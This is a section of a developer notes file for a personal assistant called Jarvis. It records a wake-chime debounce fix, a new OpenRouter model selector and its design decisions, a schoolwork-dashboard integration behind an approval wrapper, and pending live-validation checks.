**And the fix to the model selector that the owner's own first use exposed.**
`models.tier()` reads `~/.config/jarvis/models.json`, so the moment a real
selection existed, `tests/context_check.py` and `tests/fleet_check.py` — which
assert that children run on `config.TIERS[...]` — started failing against
whatever was picked in the HUD. Both point `config.MODELS_PATH` at a temp file
now. The lesson is the allowlist lesson with the arrow reversed: a suite must
not **read** live machine state any more than it may write it, and adding a
resolution layer under a value silently hands every test that asserts on it a
new dependency.

**The trade, stated plainly: this buys quality with latency.** A/B on the same
two-step task, same tools (2026-08-22): default 2.8s / $0.00169, max 5.5s /
$0.00144 — roughly **2x the wall clock**, with cost a wash on that sample
(one sample is not a verdict). On the voice surface that is time the owner
waits through, so `JARVIS_REASONING_EFFORT=medium` is the knob if the HUD
starts to feel slow. It also means **bench numbers taken before this change
are not comparable to numbers taken after it** — pin the variable when
re-running agent-bench or long-bench against the older baselines above.

**The wake chime fired once per recognizer update, not once per phrase**
(fixed 2026-08-22). Two owner reports, one cause: saying just "jarvis" chimed
**twice**, and carrying on talking after he replied chimed **again and again**.

`recog.onresult` is level-triggered by nature — Chrome delivers the phrase
being spoken as a *growing interim transcript*, one event per revision, then
delivers the same words once more as the final result. So "does this
transcript contain his name?" answers yes on every one of them: twice for a
bare "jarvis" (interim, then final), and once more for every word spoken after
it while that segment stayed open, because the transcript being revised still
began with his name. The chime was only the audible half — each of those
firings also ran `cancelTurn()` and re-armed the claim.

The 2026-08-18 rewrite had already fixed the *claim* side of exactly this
("a wake phrase claims exactly one utterance"), by spending `wakeHitAt` inside
`onWake`. What it missed is that `chime()` and `cancelTurn()` sit **above**
that guard, so the half of `onWake` that is audible was never covered by it.
The lesson generalises past this handler: **guarding what an event *does* is
not guarding how often it fires**, and a de-duplication rule belongs at the
edge that produces the events, not partway down the function that consumes
them.

Two gates now, for two different failure modes, and neither can wedge the wake
word off — which is the property that matters, because a silent wake word is a
worse bug than a loud one:

- **One decision per result segment.** A segment index that has already been
  answered cannot be answered again, however many times it is re-reported —
  and the decision is recorded even when the second gate suppresses it, so a
  suppressed hit cannot fire late when that segment is revised.
- **A 1500ms floor** (`WAKE_REFIRE_MS`), the backstop for what an index cannot
  see: Chrome may revise an earlier segment and re-deliver an old "jarvis"
  under a lower index.
- **An index below the last one fired means a new session, not an old phrase.**
  `onend` restarts recognition every few seconds and indices restart with it;
  without that rule the wake word would go silent until as many segments had
  accumulated again. Reset in `onstart` as well, and the recovery is
  self-healing either way.

Matching still concatenates from `resultIndex` on purpose — a two-word phrase
can straddle a segment boundary, and matching the pieces separately would miss
it. `tests/face/hud_wake_check.py` gained a `recognizer_checks` section that
drives the real handler through a scripted `SpeechRecognition` (the event
sequences Chrome actually produces, chimes counted rather than played); it is
verified to fail against the old handler with "the final result chimed again".

**Model selector shipped (2026-08-22)** — which model Jarvis runs on is now a
choice made in the window, not an edit to `config.py`. `models.py` holds both
halves: the **catalog** (every OpenRouter model that can run this loop, fetched
from the public `/api/v1/models` listing and cached at
`~/.cache/jarvis/openrouter-models.json`) and the **roster** (the owner's
shortlist plus which entry is selected, at `~/.config/jarvis/models.json` —
machine-local state chosen through the HUD, so it lives beside the allowlist
and the avatar pointer). In the HUD the **CORE row opens it**: the shortlist,
with ADD MODEL opening the full catalog behind a search box and two filters.

**`models.tier(name)` is the new resolution point, and that is the thing to
remember.** `config.TIERS` is still where the defaults live, but anything that
reads it *directly* silently ignores the owner's selection — the same shape of
failure as iterating `tools.REGISTRY` after deferred groups shipped (invariant
10): not an error, just the mechanism quietly not working. `agent.Agent`,
`delegate`, `_summarize`, `run_subagent`, `command_review`, the face's
`/config` and the daemon's `/status` were all moved onto it.

Which tiers move is decided by the configuration itself: **a tier whose
configured model *is* the configured orchestrator follows the selection**, and
one pointed somewhere else stays put. That is exactly the set that was already
following it — subagent, compaction, review — so "every child is the
orchestrator tier" stays true after a switch, while `worker` and `cheap` keep
their own model. The selection also beats an explicit `JARVIS_ORCHESTRATOR`,
on the avatar precedent: an environment variable is a default and a click made
a moment ago is not. Anything that must not move passes `model=` explicitly.

Four decisions worth not relitigating:

- **Eligibility is a refusal, not a badge.** The catalog keeps only models
  whose `supported_parameters` include `tools` — this is a tool-calling loop,
  and a model that cannot emit `tool_calls` cannot read a file or ask for an
  approval; it can only talk. So `models.add` validates against the catalog and
  refuses, because an id that reaches the roster is one the owner can select,
  and the resulting failure would surface a turn later with nothing pointing
  back at the picker. A catalog that cannot be reached is a refusal too, not a
  shrug. Also dropped: models with no text output, `openrouter/auto` (a router
  priced at -1 — the readout would name a model that is not the one answering),
  and **`<model>:batch`**, which is the same model addressed through the
  asynchronous batch endpoint and cannot be waited on by a turn. The tell for
  batch is the price: 55 of the 60 variants with a base model are listed at
  *exactly* half its completion price (checked live 2026-08-22). 290 of 421
  catalog entries survive all of that.
- **The intelligence numbers are reported, never computed.** OpenRouter
  republishes Artificial Analysis's `intelligence_index` inside its own catalog
  for 117 of the 290 eligible models, and that is what the IQ badge and filter
  read. An invented score in a picker reads exactly like a measured one. The
  corollary is that **unrated is `None`, never 0** — a zero would sort and
  render as "measured and terrible" — so unrated models sort last, and a
  minimum-IQ filter *hides* them, which the note under the list says out loud.
- **The agent has no tool for this.** He can change his avatar and his voice,
  but not the model he thinks with: it is the one setting that changes his own
  judgement and his own cost, and a model that could switch itself could switch
  itself cheap. Same reasoning as the MIC mute having no tool.
- **A switch mutates the live agent rather than rebuilding it.** Which model
  answers is a property of the *next request*, not of the conversation, so
  unlike `/session` it must not cost the transcript. `/model` takes
  `_agent_lock` for the same reason `/session` does — a switch requested
  mid-turn lands after that turn instead of changing models underneath one.

Degradation is one-directional, toward showing something: a failed fetch serves
the disk cache however old it is and the picker prints why it is stale (a list
drawn from a two-week-old cache with no sign of it is how a missing model
becomes a mystery), a 200 that parses to nothing eligible keeps the previous
list, and only an empty cache becomes an error the picker has to render. The
catalog is sent whole (~129KB for 290 entries) and filtered in the window,
because a search box that round-trips per keystroke is one nobody types into;
the row cap states what it dropped, per the no-silent-caps rule.

Known gap: the roster and the selection are reachable only from the HUD, so an
owner who picks a bad model and closes the window changes it back by reopening
the window (CONFIG DEFAULT is the first row) or by editing
`~/.config/jarvis/models.json`. A `jarvis model` CLI is the obvious follow-up
and was left out rather than guessed at.

**The HUD's choice is the default, and any model unpins (2026-10-08).** The
owner could not remove a pinned model in the v2 HUD (no control), could not
remove the env model at all (`_load` re-seeded it on every read), and read
the default as env-only. Now: the v2 Model picker's "Set as default" is
`select()` — persisted, beating `JARVIS_ORCHESTRATOR`, followed by every
default fast-path thread — and the env model is labelled "config default
(JARVIS_ORCHESTRATOR)", used only while nothing is selected, with "Reset to
config default" (`select("")`, which re-lists it). Every row has an × and
the catalogue's pinned rows say Unpin. **The rule that holds it together:
the effective default is always on the roster.** `remove()` raises
`RosterRefused` (409, its sentence shown in the picker) for the last model
and for any removal that would leave the effective default unlisted
("choose another default first"); an unpinned env model is remembered as
`removed_default` (naming the model, so a changed env var still seeds), and
`_load` re-seeds it anyway whenever nothing is selected. `describe()` gained
`default_source`. The v2 route maps `RosterRefused`/`NotEligible`/
`LookupError` to `fail()` because the daemon reflects only an `APIError`'s
text — a bare exception reads "request failed (RosterRefused)".
Review round (same day): 404 is `NotOnRoster` only (a bare `LookupError`
also caught real bugs' `KeyError`s); the refusal rule is the pure
`models.removal_refusal`, which the HUD mock imports instead of copying;
`describe()` reads the roster **once** (it used to re-read per field and per
row, so a concurrent change could make `selected` and `current` disagree);
`_load` treats a non-UTF-8 file as corrupt (it raised out of `effort_for`,
i.e. every v1 turn); `_save` is atomic; an `effort` beside add/remove is a
400; × on the HUD-chosen default succeeds but says the default fell back;
and the picker's "Pin a model…" opens the catalogue pin-only on top of it.
The no-tool guards (`fastpath_check`, `models_check`) cover every roster
write.

**Schoolwork integration shipped (2026-08-23).** The owner's Windows-side
schoolwork dashboard (`C:\myday\schoolwork` — Canvas + MySchoolApp merged into
one local SQLite board, read-only toward the school systems, with an agent
surface of its own: `sw review --json`, `sw prep --json`, a triage contract and
an AGENTS.md) is reachable from Jarvis via `skills/schoolwork.md` plus a WSL
wrapper at `~/.local/bin/sw`. Decisions, so they are not relitigated:

- **A skill driving the existing CLI, not a tool group.** The module already
  speaks agent — typed tools would re-describe a surface that exists. Same call
  as the wharton skill; revisit as a deferred group (invariant 10) only if
  measured usage says the round trips are worth it.
- **The wrapper exists for the approval gate, not convenience.** The raw
  invocation is `cmd.exe /c sw.cmd …`, and an ALWAYS on that mints a `cmd.exe`
  allowlist entry — arbitrary Windows execution, the `git -c` shape again. The
  wrapper's stem is `sw`, so the allowlistable unit is exactly this tool. First
  use asks; one ALWAYS covers it.
- **The DB is unreachable from WSL, verified by execution**: it is WAL-mode
  SQLite, and over the 9p mount even a `mode=ro` open fails with
  `disk I/O error` (WAL's shared-memory sidecar does not survive 9p). The CLI
  is the only channel — do not point the sqlite tool at it.
- **Network-touching subcommands stay owner-triggered** (`sync`, `login-msa`,
  `msa-probe`) — the module's own rule, carried into the skill. Sync already
  runs on a Windows scheduled task.
- **This is not the Membean case.** The dashboard tracks work and never
  submits; Jarvis plans, reports and builds study materials on request, and
  doing or submitting the schoolwork itself stays declined.

### PENDING LIVE VALIDATION — needs API keys (delete this section once done)

Everything above was built and tested in a sandbox with **no `OPENROUTER_API_KEY`**,
so every check is synthetic. The free suites all pass (`context_check`,
`longhorizon_check`, plus `secrets`, `permissions`, `skills`, `workflows`,
`gmail`, `onshape`, `face/approval_check`, `face/controls_check`). What a
human with keys still has to confirm — **and this list should be deleted from
CLAUDE.md once it has been, with the results folded into the notes above:**

1. **Playwright suites never ran here** — not installed in the sandbox. Run
   `tests/browser/policy_check.py`, `tests/browser/thread_check.py`, and the
   `tests/face/` HUD suites (`hud_state_check`, `hud_approval_check`,
   `whiteboard_check`, `attach_check`, `hud_input_check`). They are free; they
   just need the browser. Nothing in this change touches them, so a failure
   means a genuine regression.
2. **Does the model actually use `plan_write`?** The mechanism is tested; the
   *prompting* is not. Give Luna a genuinely long task (a multi-file refactor,
   a 10-part research job) via `jarvis chat` and watch whether it writes a plan
   unprompted and keeps it current, or ignores the tool. If it ignores it, the
   system-prompt paragraph in `config.py` is what needs work, not the tool.
3. **Does `run_subagent` earn its cost?** Same task twice, once with the tool
   available and once without, comparing total `$` and whether the answer holds
   up. The bet is that isolation pays for the extra model call; that bet is
   unverified. Watch for the failure mode where the model delegates something
   it should have done itself and pays twice for a worse answer.
4. **A real run past the compaction threshold.** Nothing has yet exercised
   compaction against a live model — the orphan fix is proven synthetically
   only. A long browser or CAD session (parallel `cad_render` calls are the
   exact shape that triggered the bug) crossing 60k tokens would confirm no
   400s and that the pinned goal reads sensibly after a summary lands.
4b. **Does the model actually use `edit_file` and `grep_files`?** (Added
   2026-08-09.) Both are mechanically tested; the *prompting* is not. Watch a
   real self-improve or CAD session for three things: whether it reaches for
   `edit_file` instead of rewriting whole files, whether it pages past the
   first `read_file` footer on CLAUDE.md rather than stopping there, and
   whether it starts a search with `mode='files'`. If it ignores them, the
   system-prompt paragraph in `config.py` needs work, not the tools. Also
   worth measuring on agent-bench: `project` is the task these should move,
   and the baseline to beat is Luna's 100% at $0.0065 / 115s — the interesting
   number is **cost**, not score.
5. **Stale plans across turns.** The plan persists for the life of the agent,
   which is the point for long work but means a finished checklist can linger
   in the face's persistent agent into an unrelated conversation. The model can
   clear it with `plan_write("")`. Check in live use whether it does, or
   whether the plan needs to expire.
6. **Does the model actually delegate to `task_start`?** (Added 2026-08-20.)
   The mechanism is tested; the *prompting* is not — the same bet as
   `plan_write`'s. Run `jarvis face`, ask for a real job ("refactor X", "write
   me a report on Y") and keep talking: does he start a task and stay
   conversational, or grind through it inline? Does an approval card raised by
   the task carry its label, and does he read `task_log` before summarizing
   results instead of inventing them? And the inverse failure: does he
   delegate two-step jobs that were cheaper inline? If the judgment is off,
   the delegation paragraph in `config.py` is what needs work, not the tools.

7. **Spotify, end to end.** (Added 2026-08-21.) Everything is synthetic —
   there is no account connected here. Run `jarvis auth spotify`, then check
   the three things a fake transport cannot: that the **consent redirect
   actually lands** on 127.0.0.1:8406 (a redirect URI that differs by one
   character fails at the *token exchange*, not at consent, so the browser says
   success and the CLI says no refresh token); that a **refresh an hour later
   still works**, which is the rotation path; and that `spotify_play("my <x>
   playlist")` picks the owner's playlist rather than a stranger's. Then the
   judgement question, the same one `plan_write` and `task_start` have open:
   with only `spotify_play`/`spotify_status` visible, does the model call
   `load_tools('spotify')` when it needs to pause or queue, or does it flounder
   with the two it has? If it flounders, the pointer wording in
   `Agent._groups_block` is what needs work, not the mechanism.

8. **A real turn on a switched model.** (Added 2026-08-22.) Every model check
   is synthetic — the roster, the catalog and the routes are all exercised
   against a fixture. What a fixture cannot answer: pick a non-default model in
   the HUD, run a real turn, and confirm the tool calls actually land (the
   eligibility filter says the model *advertises* `tools`, which is not the
   same as being good at them — the 2026-07-30 bench found tool-calling quality
   varies by provider, not just by model), that the SYSTEMS CORE row and the
   cost readout agree with what was billed, and that a sub-agent spawned during
   that turn ran on the same model rather than the configured default.

Later: real integrations (calendar/email), scheduled proactive runs, and
more registered desktop apps as they earn their place (each is one entry in
`config.DESKTOP_APPS`, plus a backend choice — `uia` for native/UWP, `msaa`
for anything Chromium-based).
